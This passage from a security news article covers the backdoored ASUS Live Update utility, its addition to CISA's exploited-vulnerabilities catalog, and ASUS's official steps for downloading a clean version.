Live Update. The attack was particularly effective because that utility came preinstalled on most ASUS devices and was used to the automatically update BIOS, UEFI, drivers, and other components.CISA now notes that the affected devices could be abused to perform unintended actions if certain conditions are met. Originally, the attackers reportedly targeted only around 600 specific devices, based on hashed MAC addresses hardcoded in various versions of the tool. This was despite the fact that millions of users may have downloaded the backdoored utility.Support for the ASUS Live Update application has since been discontinued. The final intended version of ASUS Live Update was 3.6.15, but it will continue to provide software updates. This is likely why a CVE was assigned and why the vulnerability was added to the KEV catalog. There was no official “why now” statement from ASUS, MITRE, or CISA, but the timing aligns with a legacy, end-of-support product being reclassified as a vulnerability with confirmed active exploitation.What do ASUS users need to do?First of all, make sure you’re running a clean version of the utility. ASUS urges users to update to version  to address known security issues.Alternatively, you can download and install the latest version manually. ASUS’ own support article describes the only official way to get the current Live Update package:​Go to the ASUS Official Website (asus.com)Use the search box to find your exact model (e.g., UX580GD)Open the product page and click  → Select your operating system (e.g., Windows 10/11 64-bit).​In the  section, locate  and click This is as close as we could get you to a “direct” official download. The URL is different for every model and ASUS does not provide a central Live Update installer directory. While this makes it harder than it maybe should be, we do recommend using this official download. Given the history of supply chain abuse involving this tool, downloading it from third-party sources is a risk not worth taking.We don’t just report on threats—we remove them]]></content:encoded></item></channel></rss>
